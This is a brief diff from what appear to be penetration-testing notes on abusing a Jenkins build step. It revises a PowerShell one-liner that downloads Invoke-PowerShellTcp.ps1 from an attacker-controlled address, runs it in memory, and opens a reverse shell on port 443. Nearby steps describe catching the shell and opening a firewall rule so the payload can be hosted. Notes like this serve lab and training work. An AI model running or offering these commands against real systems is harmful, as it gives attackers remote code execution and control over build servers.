@@ -23,7 +23,7 @@ println "out> $sout err> $serr"
 
 Add a "Execute Windows Batch command" build step and catch a reverse shell
 ```powershell
-powershell.exe iex (iwr -UseBasicParsing http://172.16.100.48/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress 172.16.100.48 -Port 443
+powershell.exe iex(iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -useb);power -Reverse -IPAddress 172.16.100.48 -Port 443
 ```
 
 1. Create a local firewall rule to allow the hosting of a webserver
